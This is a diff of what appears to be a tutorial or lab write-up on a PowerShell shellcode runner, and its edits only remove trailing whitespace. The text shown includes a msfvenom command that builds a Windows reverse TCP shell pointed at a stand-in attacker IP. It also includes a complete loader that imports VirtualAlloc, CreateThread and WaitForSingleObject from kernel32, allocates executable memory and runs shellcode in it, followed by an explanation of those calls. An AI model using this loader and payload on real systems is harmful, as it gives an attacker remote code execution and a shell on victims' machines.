@@ -23,50 +23,50 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKBOX_IP LPORT=1111 -f power
 ```cs
 $VrtAlloc = @"
 using System;
-using System.Runtime.InteropServices; 
+using System.Runtime.InteropServices;
 
-public class VrtAlloc{ 
- [DllImport("kernel32")] 
+public class VrtAlloc{
+ [DllImport("kernel32")]
  public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
-} 
-"@ 
+}
+"@
 
-Add-Type $VrtAlloc 
+Add-Type $VrtAlloc
 
-$WaitFor= @" 
-using System; 
-using System.Runtime.InteropServices; 
+$WaitFor= @"
+using System;
+using System.Runtime.InteropServices;
 
-public class WaitFor{ 
- [DllImport("kernel32.dll", SetLastError=true)] 
-  public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds); 
-} 
-"@ 
+public class WaitFor{
+ [DllImport("kernel32.dll", SetLastError=true)]
+  public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
+}
+"@
 
-Add-Type $WaitFor 
+Add-Type $WaitFor
 
-$CrtThread= @" 
-using System; 
-using System.Runtime.InteropServices; 
+$CrtThread= @"
+using System;
+using System.Runtime.InteropServices;
 
-public class CrtThread{ 
- [DllImport("kernel32", CharSet=CharSet.Ansi)] 
-  public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId); 
+public class CrtThread{
+ [DllImport("kernel32", CharSet=CharSet.Ansi)]
+  public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
 
-} 
-"@ 
-Add-Type $CrtThread 
+}
+"@
+Add-Type $CrtThread
 
-[Byte[]] $buf = SHELLCODE_PLACEHOLDER 
-[IntPtr]$addr = [VrtAlloc]::VirtualAlloc(0, $buf.Length, 0x3000, 0x40) 
-[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $buf.Length) 
-$thandle = [CrtThread]::CreateThread(0, 0, $addr, 0, 0, 0) 
+[Byte[]] $buf = SHELLCODE_PLACEHOLDER
+[IntPtr]$addr = [VrtAlloc]::VirtualAlloc(0, $buf.Length, 0x3000, 0x40)
+[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $buf.Length)
+$thandle = [CrtThread]::CreateThread(0, 0, $addr, 0, 0, 0)
 [WaitFor]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF")
 ```
 
 ### Explanation of the Code
 
-The script starts by defining a few C# classes. These classes use the `DllImport` attribute to load specific functions from the `kernel32` DLL, which is part of the Windows API.  
+The script starts by defining a few C# classes. These classes use the `DllImport` attribute to load specific functions from the `kernel32` DLL, which is part of the Windows API.
 
 - `VirtualAlloc`: This function allocates memory in the process's address space. It's commonly used in scenarios like this to prepare memory for storing and executing shellcode.
 - `CreateThread`: This function creates a new thread in the process. The thread will execute the shellcode that has been loaded into memory.
